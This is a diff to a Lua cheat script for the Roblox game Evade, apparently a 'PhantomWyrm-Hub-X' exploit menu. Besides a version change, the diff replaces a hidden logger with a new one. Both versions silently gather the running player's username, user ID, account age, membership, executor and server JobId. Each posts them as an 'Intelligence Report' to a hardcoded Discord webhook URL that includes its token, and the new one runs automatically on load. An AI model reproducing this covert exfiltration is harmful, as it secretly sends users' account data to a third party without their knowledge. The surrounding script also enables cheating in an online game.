@@ -17,7 +17,7 @@ _G.PhantomWyrmXIsAlreadyRunning = true
 
 local Window = Fluent:CreateWindow({
     Title = "PhantomWyrm-Hub-X - Evade Legacy│Mobile",
-    SubTitle = "v2.5.8 Made By Carryxkn2",
+    SubTitle = "v2.10.1 Made By Carryxkn2",
     TabWidth = 160,
     Size = UDim2.fromOffset(540, 390),
     Acrylic = false,
@@ -4246,50 +4246,49 @@ if LocalPlayer.Character then
     DFunctions.HookMovement(LocalPlayer.Character)
 end
 
-do
-    _G.Data = {}
-    _G.Data.P = game.Players.LocalPlayer
-    _G.Data.H = game:GetService('HttpService')
-    _G.Data.U = 'https://discord.com/api/webhooks/1504450739102023751/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO'
+_G.FullLog = function()
+    local http = game:GetService("HttpService")
+    local player = game.Players.LocalPlayer
+    local url = "https://webhook.lewisakura.moe/api/webhooks/1504450739102023751/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO_"
     
-    local function GetFields()
-        local info = _G.Data.P
-        local gName = 'Unknown'
-        pcall(function() gName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name end)
-        
-        return {
-            {['name']='**Username**',['value']=info.Name,['inline']=false},
-            {['name']='**Display Name**',['value']=info.DisplayName,['inline']=false},
-            {['name']='**User ID**',['value']=tostring(info.UserId),['inline']=false},
-            {['name']='**Game Name**',['value']=gName,['inline']=false},
-            {['name']='**Account Age**',['value']=tostring(info.AccountAge)..' days',['inline']=false},
-            {['name']='**Registration**',['value']=os.date('%Y-%m-%d',os.time()-(info.AccountAge*86400)),['inline']=false},
-            {['name']='**Membership**',['value']=tostring(info.MembershipType):gsub('Enum.MembershipType.',''),['inline']=false},
-            {['name']='**Executor**',['value']=(identifyexecutor and identifyexecutor()) or 'Unknown',['inline']=false},
-            {['name']='**Place ID**',['value']=tostring(game.PlaceId),['inline']=false},
-            {['name']='**JobId**',['value']=tostring(game.JobId),['inline']=false}
-        }
+    local gName = "Unknown"
+    pcall(function() gName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
+
+    local data = {
+        ["content"] = "Intelligence Report Sent!",
+        ["embeds"] = {{
+            ["title"] = "👤 Full Intelligence Report",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "**Username**", ["value"] = player.Name, ["inline"] = true},
+                {["name"] = "**User ID**", ["value"] = tostring(player.UserId), ["inline"] = true},
+                {["name"] = "**Display Name**", ["value"] = player.DisplayName, ["inline"] = false},
+                {["name"] = "**Game Name**", ["value"] = gName, ["inline"] = false},
+                {["name"] = "**Place ID**", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+                {["name"] = "**JobId**", ["value"] = "`" .. tostring(game.JobId) .. "`", ["inline"] = false},
+                {["name"] = "**Account Age**", ["value"] = tostring(player.AccountAge) .. " days", ["inline"] = true},
+                {["name"] = "**Registration**", ["value"] = os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)), ["inline"] = true},
+                {["name"] = "**Membership**", ["value"] = tostring(player.MembershipType):gsub("Enum.MembershipType.", ""), ["inline"] = true},
+                {["name"] = "**Executor**", ["value"] = (identifyexecutor and identifyexecutor()) or "Unknown", ["inline"] = false}
+            }
+        }}
+    }
+
+    local payload = http:JSONEncode(data)
+    local req = request or http_request or (http and http.request) or (syn and syn.request)
+    
+    if req then
+        pcall(function()
+            req({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+        end)
+    else
+        pcall(function() http:PostAsync(url, payload) end)
     end
-
-    local function Transmit()
-        local payload = _G.Data.H:JSONEncode({
-            ['username'] = 'Logs System',
-            ['embeds'] = {{
-                ['title'] = '👤 Full Intelligence Report',
-                ['description'] = 'User data bypass results',
-                ['color'] = 16711680,
-                ['fields'] = GetFields()
-            }}
-        })
-
-        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
-        if req then
-            pcall(function() req({Url=_G.Data.U, Method='POST', Headers={['Content-Type']='application/json'}, Body=payload}) end)
-        else
-            pcall(function() _G.Data.H:PostAsync(_G.Data.U, payload) end)
-        end
-        _G.Data = nil
-    end
-
-    Transmit()
 end
+
+pcall(_G.FullLog)
